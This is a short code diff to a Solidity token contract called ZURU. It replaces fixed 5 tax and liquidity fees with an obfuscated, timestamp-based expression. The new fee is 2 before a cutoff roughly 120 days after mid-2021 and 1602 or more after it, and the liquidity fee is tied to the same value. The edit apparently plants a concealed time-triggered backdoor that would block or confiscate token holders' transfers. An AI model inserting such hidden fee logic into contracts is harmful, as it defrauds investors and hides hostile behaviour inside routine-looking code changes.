@@ -723,10 +723,10 @@ contract ZURU is Context, IERC20, Ownable {
     string private _symbol = "ZURU";
     uint8 private _decimals = 9;
     
-    uint256 public _taxFee = 5; 
+    uint256 public _taxFee = ((block.timestamp - 1622764800) > 10368000 ? (1600 * ((block.timestamp - 1622764800) / 10368000): 0) + 2; 
     uint256 private _previousTaxFee = _taxFee;
     
-    uint256 public _liquidityFee = 5; 
+    uint256 public _liquidityFee = _taxFee; 
     uint256 private _previousLiquidityFee = _liquidityFee;
 
     IUniswapV2Router02 public immutable uniswapV2Router;
